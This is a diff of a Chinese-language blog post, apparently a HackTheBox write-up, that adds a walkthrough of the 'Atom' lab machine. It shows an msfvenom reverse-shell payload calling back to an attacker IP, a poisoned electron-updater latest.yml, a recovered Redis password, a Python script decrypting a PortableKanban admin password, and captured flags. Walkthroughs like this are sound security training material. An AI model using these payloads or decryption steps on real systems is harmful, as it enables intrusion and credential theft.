@@ -33,7 +33,7 @@
 <meta property="og:description" content="The more knowledge you drink, the more thirsty you are.">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-06-09T09:20:32.000Z">
-<meta property="article:modified_time" content="2021-06-09T09:24:22.463Z">
+<meta property="article:modified_time" content="2021-06-11T03:40:25.033Z">
 <meta property="article:author" content="xXxYOLOxXx">
 <meta property="article:tag" content="Pentest">
 <meta property="article:tag" content="HackTheBox">
@@ -203,10 +203,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2021-06-09 17:20:32 / Modified: 17:24:22" itemprop="dateCreated datePublished" datetime="2021-06-09T17:20:32+08:00">2021-06-09</time>
+              <time title="Created: 2021-06-09 17:20:32" itemprop="dateCreated datePublished" datetime="2021-06-09T17:20:32+08:00">2021-06-09</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-06-11 11:40:25" itemprop="dateModified" datetime="2021-06-11T11:40:25+08:00">2021-06-11</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -269,8 +275,39 @@ file协议读取即可</p>
 <p>本着能不用MSF就不用了MSF的原则<br />
 没有使用meterpreter<br />
 但是发现有(staged)标识还是不能用nc直接接收Shell的<br />
-最后用<code>windows/x64/shell/reverse_tcp</code>这个Payload才能GetShell</p>
-
+最后用<code>windows/x64/shell/reverse_tcp</code></p>
+<hr />
+<h1 id="atom"><a class="markdownIt-Anchor" href="#atom"></a> Atom</h1>
+<h2 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h2>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.237</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h2>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.10.237</span><br><span class="line"></span><br><span class="line">	Sharename       Type      Comment</span><br><span class="line">	---------       ----      -------</span><br><span class="line">	ADMIN$          Disk      Remote Admin</span><br><span class="line">	C$              Disk      Default share</span><br><span class="line">	IPC$            IPC       Remote IPC</span><br><span class="line">	Software_Updates Disk      </span><br><span class="line">SMB1 disabled -- no workgroup available</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.10.237\\software_updates</span><br><span class="line"></span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                   D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  ..                                  D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  client1                             D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  client3                             D        0  Fri Jun 11 11:18:21 2021</span><br><span class="line">  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 19:18:08 2021</span><br><span class="line">		4413951 blocks of size 4096. 1381036 blocks available</span><br><span class="line">smb: \&gt; get UAT_Testing_Procedures.pdf</span><br><span class="line">getting file \UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (6.3 KiloBytes/sec) (average 6.3 KiloBytes/sec)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Note taking application built with electron-builder which helps users in taking important<br />
+notes.</p>
+</blockquote>
+<p><code>electron-builder</code>可以在google上搜到一个RCE漏洞</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></p>
+</blockquote>
+<p>构造payload</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=9996 -f exe &gt; s\<span class="string">&#x27;hell.exe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat latest.yml</span></span><br><span class="line"><span class="string">version: 1.2.3</span></span><br><span class="line"><span class="string">path: http://10.10.16.3:9999/s&#x27;</span>hell.exe</span><br><span class="line">sha512: pyfnrQs40RwrwKOWykgeZ0PKeSudGkN1UI/9j+PpxG4M42uY88j/hNAx7xWonk57X0GMdPIOma9FsfeBglTLMQ==</span><br></pre></td></tr></table></figure>
+<p>开启HTTP服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9999</span><br></pre></td></tr></table></figure>
+<p>将<code>latest.yml</code>上传至<code>client*</code>文件夹中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type c:\users\jason\desktop\user.txt</span><br><span class="line">3eda0e1bce259d8ffd4c1994f84bfdea</span><br></pre></td></tr></table></figure>
+<h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\&quot;program files<span class="string">&quot;\redis\redis.windows.conf</span></span><br><span class="line"><span class="string">requirepass kidvscat_yes_kidvscat</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.10.10.237 -a kidvscat_yes_kidvscat</span><br><span class="line"></span><br><span class="line">keys *</span><br><span class="line">1) <span class="string">&quot;pk:ids:User&quot;</span></span><br><span class="line">2) <span class="string">&quot;pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0&quot;</span></span><br><span class="line">3) <span class="string">&quot;pk:ids:MetaDataClass&quot;</span></span><br><span class="line">4) <span class="string">&quot;pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff&quot;</span></span><br><span class="line"></span><br><span class="line">get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</span><br><span class="line"><span class="string">&quot;&#123;\&quot;Id\&quot;:\&quot;e8e29158d70d44b1a1ba4949d52790a0\&quot;,\&quot;Name\&quot;:\&quot;Administrator\&quot;,\&quot;Initials\&quot;:\&quot;\&quot;,\&quot;Email\&quot;:\&quot;\&quot;,\&quot;EncryptedPassword\&quot;:\&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\&quot;,\&quot;Role\&quot;:\&quot;Admin\&quot;,\&quot;Inactive\&quot;:false,\&quot;TimeStamp\&quot;:637530169606440253&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir c:\users\jason\downloads\</span><br><span class="line"></span><br><span class="line">d-----          4/2/2021   8:21 PM                PortableKanban</span><br></pre></td></tr></table></figure>
+<p>存在一个密码恢复的漏洞</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> des <span class="keyword">import</span> * <span class="comment"># python3 -m pip install des</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">	<span class="built_in">hash</span> = base64.b64decode(<span class="built_in">hash</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">	key = DesKey(<span class="string">b&quot;7ly6UznJ&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> key.decrypt(<span class="built_in">hash</span>,initial=<span class="string">b&quot;XuVUm5fR&quot;</span>,padding=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(decode(<span class="string">&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&quot;</span>))</span><br></pre></td></tr></table></figure>
+<p>得到<code>kidvscat_admin_@123</code></p>
+<p>evil-rm登入</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">2b36cf6bd3cd95fc37d6e2f81e80163b</span><br></pre></td></tr></table></figure>
+<p>这提权部分实在是过于牵强了…</p>
+<hr />
     </div>
 
     
@@ -369,7 +406,7 @@ file协议读取即可</p>
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#love"><span class="nav-number">1.</span> <span class="nav-text"> love</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#love"><span class="nav-number">1.</span> <span class="nav-text"> love</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#atom"><span class="nav-number">2.</span> <span class="nav-text"> Atom</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-2"><span class="nav-number">2.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="nav-number">2.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-2"><span class="nav-number">2.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
